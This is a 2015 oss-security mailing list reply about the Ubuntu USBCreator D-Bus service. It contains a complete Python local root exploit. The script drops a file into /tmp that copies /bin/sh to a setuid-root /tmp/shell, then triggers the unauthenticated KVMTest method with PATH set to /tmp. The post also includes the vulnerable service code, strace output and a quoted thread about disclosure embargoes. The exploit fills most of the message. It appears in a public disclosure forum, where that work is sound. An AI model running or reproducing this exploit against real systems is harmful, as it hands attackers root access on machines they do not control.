@@ -1,0 +1,168 @@
+
+Date: Fri, 24 Apr 2015 17:04:51 -0500
+From: Grandma Eubanks <tborland1@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: USBCreator D-Bus service
+
+So, the reason there's problems in people's VM testing may be due to their
+configuration for memory usage. Also, without qemu-kvm (or kvm command in
+search path), it won't call KVM and has a limited search path that does not
+include CWD and our own controlled envp won't get triggered until kvm is
+found. If we can control an arbitrary file creation bug (apport?),
+ld_preload would be the way to go as shown in tavis's poc.
+
+# By TurboBorland
+# Sometimes, to interact with dbus over remtoe console, you'll need:
+# export DISPLAY=:0
+import dbus
+from os import chmod,unlink
+
+def
+test_dbus(bus_type,bus_name,path,interface,object_method_name,*argument):
+    bus = dbus.SystemBus()
+
+
+print("bus_type:\t%s\nbus_name:\t%s\npath:\t\t%s\ninterface:\t%s\nmethod:\t\t%s\nargument:\t%s\n"
+% (bus_type,bus_name,path,interface,object_method_name,argument))
+    bus_object = bus.get_object(bus_name,path)
+    object_method = bus_object.get_dbus_method(object_method_name,interface)
+    object_method(*argument)
+
+
+def check_req():
+    f = open("/proc/meminfo","r")
+    free = 0
+    for line in f:
+        if (line.find("MemFree") != -1):
+            memfree = (int(line.split(":")[1][:-3])/1024)
+            #print(str(memfree))
+        elif (line.find("Buffers") != -1):
+            buffers = (int(line.split(":")[1][:-3])/1024)
+            memfree += buffers
+            #print(str(memfree))
+    if (memfree < 768):    exit("Not enough memory to pass mem_free()
+condition")
+
+def drop_bomb():
+    try:    f = open("/usr/bin/kvm","r")
+    except IOError as e:    exit("KVM does not exist in /usr/bin/kvm. Wrong
+directory or not installed?\n%s" % e)
+    for line in f:
+        if (line.find("exec") != -1):
+            dropfile = "/tmp/" + line.split(" ")[1]
+
+    f = open(dropfile,"w")
+    f.write("#!/bin/sh\n/bin/cp /bin/sh /tmp/shell\n/bin/chown root:root
+/tmp/shell\n/bin/chmod 04755 /tmp/shell")
+    f.close()
+
+    # sigh, tried so hard to stay away from having to do anything with os
+import
+    # if anyone knows how to set +x without this, I would love you long time
+    chmod(dropfile,755)
+    return dropfile
+
+def trigger_vuln(dropfile):
+    device = "/dev/sda"
+    # make sure /tmp is not nosuid, or choose somewhere else
+    env = {"DISPLAY": ":0","XAUTHORITY": "a", "PATH": "/tmp"}
+    args = (device,env)
+
+    # introspect, enable to see commands and arguments for USBCreator
+
+#test_dbus("system","com.ubuntu.USBCreator","/com/ubuntu/USBCreator","org.freedesktop.DBus.Introspectable","Introspect","")
+
+test_dbus("system","com.ubuntu.USBCreator","/com/ubuntu/USBCreator","com.ubuntu.USBCreator","KVMTest",*args)
+    unlink(str(dropfile))
+
+if __name__ == '__main__':
+#    check_req()
+    print("Requirements passed")
+    dropfile = drop_bomb()
+    print("The setup is ready")
+    trigger_vuln(dropfile)
+    exit("shell dropped in /tmp/shell")
+
+
+'''
+vuln code (lack of check_polkit here and kvm-lk):
+
+    @dbus.service.method(USBCREATOR_IFACE, in_signature='sa{ss}',
+out_signature='')
+    def KVMTest(self, device, env):
+        #Run KVM with the freshly created device as the first disk.
+        for key in ('DISPLAY', 'XAUTHORITY'):
+            if key not in env:
+                logging.debug('Missing %s' % key)
+                return
+        udisks = UDisks.Client.new_sync(None)
+        obj = _get_parent_object(udisks, device)
+        # TODO unmount all the partitions.
+        dev_file =
+obj.get_block().get_cached_property('Device').get_bytestring().decode('utf-8')
+        if mem_free() >= 768:
+            envp = []
+            for k, v in env.items():
+                envp.append('%s=%s' % (str(k), str(v)))
+            cmd = ('kvm', '-m', '512', '-hda', str(dev_file))
+            flags = (GObject.SPAWN_SEARCH_PATH)
+            # Don't let SIGINT propagate to the child.
+            GObject.spawn_async(cmd, envp=envp, flags=flags,
+child_setup=os.setsid)
+'''
+
+'''
+SPAWN_SEARCH_PATH (can we get around this to break the kvm binary
+requirement?):
+15071 execve("/usr/sbin/kvm", ["kvm", "-m", "512", "-hda", "/dev/sda"],
+["XAUTHORITY=a", "PATH=/tmp", "DISPLAY=:0"]) = -1 ENOENT (No such file or
+directory)
+15071 execve("/usr/bin/kvm", ["kvm", "-m", "512", "-hda", "/dev/sda"],
+["XAUTHORITY=a", "PATH=/tmp", "DISPLAY=:0"]) = -1 ENOENT (No such file or
+directory)
+15071 execve("/sbin/kvm", ["kvm", "-m", "512", "-hda", "/dev/sda"],
+["XAUTHORITY=a", "PATH=/tmp", "DISPLAY=:0"]) = -1 ENOENT (No such file or
+directory)
+15071 execve("/bin/kvm", ["kvm", "-m", "512", "-hda", "/dev/sda"],
+["XAUTHORITY=a", "PATH=/tmp", "DISPLAY=:0"]) = -1 ENOENT (No such file or
+directory)
+'''
+
+I'm sure there's better ways to do some of this, and there's a few comments
+you can uncomment to help you figure other things out.
+
+On Thu, Apr 23, 2015 at 1:22 AM, Kurt Seifried <kseifried@...hat.com> wrote:
+
+> On 04/22/2015 07:49 PM, Solar Designer wrote:
+> > On Wed, Apr 22, 2015 at 05:50:35PM -0700, Tavis Ormandy wrote:
+> >> On Wednesday, April 22, 2015, Seth Arnold <seth.arnold@...onical.com>
+> wrote:
+> >>> We treat local root escalation vulnerabilities with a high priority[1].
+> >>
+> >> I wish you had spoken up during the previous discussion. It was my
+> >> impression that embargoes for local privilege escalations were
+> universally
+> >> considered deprecated.
+> >
+> > I think Kurt's comment (in the linux-distros discussion) on not needing
+> > further vulnerability reports embargoed applied solely to ABRT.
+> >
+> > I can see how this can appear as extending to any local root issues, for
+> > users who have ABRT installed and enabled.
+> >
+> > Kurt might want to clarify this.
+> >
+> > Alexander
+>
+> Clarification won't be possible for a bit, I'm actually meeting with
+> Tavis tomorrow to discuss this and other things (this was scheduled some
+> time ago, it seems I was right in assuming this would become a bigger
+> issue =).
+>
+>
+> --
+> Kurt Seifried -- Red Hat -- Product Security -- Cloud
+> PGP A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
+>
+>
+
